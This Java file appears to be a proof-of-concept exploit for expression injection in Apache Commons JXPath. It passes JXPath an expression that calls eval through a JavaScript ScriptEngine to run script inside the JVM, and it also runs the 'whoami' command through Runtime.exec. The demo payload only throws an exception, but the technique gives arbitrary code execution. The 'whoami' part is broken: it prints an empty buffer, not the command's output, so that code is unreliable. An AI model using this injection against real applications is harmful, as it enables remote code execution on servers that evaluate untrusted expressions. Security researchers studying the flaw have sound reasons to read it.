package JXpath;

import org.apache.commons.jxpath.JXPathContext;

import javax.script.ScriptEngine;
import java.io.BufferedReader;
import java.io.InputStreamReader;

import java.lang.Runtime;
public class exp3 {
    public static void main(String[] args) {
        try {
            byte[] bytes = new byte[1024];

            java.lang.Runtime.getRuntime().exec("whoami").getInputStream().read(new byte[1024]);
            System.out.println(new String(bytes));
            // new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()))

            JXPathContext context = JXPathContext.newContext(null);
            context.getValue("eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'throw new java.lang.Exception(\"pysnow\");')");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
